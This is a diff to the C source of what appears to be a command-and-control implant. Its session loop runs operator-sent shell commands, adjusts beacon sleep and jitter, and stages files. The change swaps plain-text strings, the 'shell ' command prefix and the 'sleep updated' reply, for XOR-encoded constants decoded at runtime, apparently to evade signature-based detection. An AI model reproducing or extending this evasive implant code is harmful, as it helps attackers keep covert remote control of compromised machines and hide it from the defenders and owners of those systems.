@@ -261,6 +261,9 @@ void session_loop(int sock, uint8_t *session_key, uint32_t beacon_id,
             if (task_data)
                 decode_run_req(task_data, (int)task_data_len, cmd, sizeof(cmd));
 
+            char shell_pfx[ENC_SHELL_PREFIX_LEN + 1];
+            xor_dec(shell_pfx, ENC_SHELL_PREFIX, ENC_SHELL_PREFIX_LEN);
+
             char *builtin_out = malloc(MAX_CMD_OUTPUT);
             if (!builtin_out) { free(plain); continue; }
             builtin_out[0] = '\0';
@@ -269,7 +272,7 @@ void session_loop(int sock, uint8_t *session_key, uint32_t beacon_id,
                 send_result_session(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
                                     FLAG_NONE, builtin_out, session_key);
                 free(builtin_out);
-            } else if (strncmp(cmd, "shell ", 6) == 0) {
+            } else if (strncmp(cmd, shell_pfx, ENC_SHELL_PREFIX_LEN) == 0) {
                 free(builtin_out);
                 size_t out_len = 0;
                 char *output = exec_command_shell(cmd + 6, &out_len);
@@ -294,9 +297,10 @@ void session_loop(int sock, uint8_t *session_key, uint32_t beacon_id,
             *sleep_sec   = interval;
             *jitter_pct  = jitter;
 
-            char sleep_updated[] = {'s','l','e','e','p',' ','u','p','d','a','t','e','d','\0'};
+            char sleep_msg[ENC_LX_SLEEP_UPDATED_LEN + 1];
+            xor_dec(sleep_msg, ENC_LX_SLEEP_UPDATED, ENC_LX_SLEEP_UPDATED_LEN);
             send_result_session(sock, hdr.label, TASK_SET, CODE_SET_SLEEP,
-                                FLAG_NONE, sleep_updated, session_key);
+                                FLAG_NONE, sleep_msg, session_key);
         }
         else if (hdr.type == TASK_FILE_STAGE && task_data) {
             handle_file_stage(beacon_id, hdr.label, hdr.identifier,
